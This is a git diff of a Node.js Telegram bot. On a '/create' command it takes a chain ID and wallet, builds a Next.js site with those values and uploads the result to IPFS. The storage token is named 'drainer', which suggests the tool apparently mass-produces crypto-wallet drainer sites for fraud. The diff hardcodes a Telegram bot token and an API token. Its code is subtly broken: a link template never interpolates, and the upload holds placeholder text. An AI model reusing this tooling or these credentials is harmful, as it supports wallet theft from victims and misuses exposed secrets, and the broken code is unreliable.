@@ -2,7 +2,7 @@ const amqp = require("amqplib/callback_api");
 const { exec } = require("child_process");
 const fs = require("fs");
 const TelegramBot = require("node-telegram-bot-api");
-const axios = require('axios')
+const axios = require("axios");
 const token = "5882548762:AAEx6_d4hGGoKqvHr84VAsZL9PyfiFdcEso";
 const bot = new TelegramBot(token, { polling: true });
 
@@ -64,7 +64,6 @@ bot.onText(/\/create (.+)/, (msg, match) => {
         chainId,
         wallet,
         chatId,
-        bot,
     };
 
     // Sending a POST request to the API
@@ -186,14 +185,12 @@ NEXT_PUBLIC_OWNER=${NEXT_PUBLIC_OWNER}`;
     return envContent;
 }
 
-async function uploadFile_IPFS(path, owner, bot, chatId) {
+async function uploadFile_IPFS(path, owner, chatId) {
     const { Web3Storage, File } = await import("web3.storage");
     const token =
         "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWQ6ZXRocjoweDgwNjVkN0QwODU2ZEM0NTkwN2FmOTE0YTE3NUU4ZEU1Y2UyNEIxNjkiLCJpc3MiOiJ3ZWIzLXN0b3JhZ2UiLCJpYXQiOjE2ODgwNTE2MjA3NjgsIm5hbWUiOiJkcmFpbmVyIn0.39b-VsOS8LSOIWfx_I9qKRSFTH804jGo_EZT2Ihp76s";
     const storage = new Web3Storage({ token });
-    const files = [
-        new File([owner + "zip file"], "./zipfile/" + owner + ".zip"),
-    ];
+    const files = [new File([owner + "zip file"], path)];
     const cid = await storage.put(files);
     // console.log("Content added with CID:", cid);
     bot.sendMessage(chatId, "https://dweb.link/ipfs/${cid}/zipfile");
@@ -210,8 +207,8 @@ async function runBuild(envData) {
         NEXT_PUBLIC_OWNER,
     } = parsedData.envData;
 
-    const { bot_chatid, bot } = parsedData.chatData;
-    console.log(bot_chatid, bot);
+    const { bot_chatid } = parsedData.chatData;
+    console.log(bot_chatid);
     // 运行npm run build命令
 
     //将.env数据写入Next.js的.env文件;
@@ -230,7 +227,7 @@ async function runBuild(envData) {
                     reject(error);
                 } else {
                     const path = "./zipfile/" + NEXT_PUBLIC_OWNER + ".zip";
-                    uploadFile_IPFS(path, NEXT_PUBLIC_OWNER, bot, bot_chatid);
+                    uploadFile_IPFS(path, NEXT_PUBLIC_OWNER, bot_chatid);
                     console.log("Build completed successfully");
                     resolve();
                 }
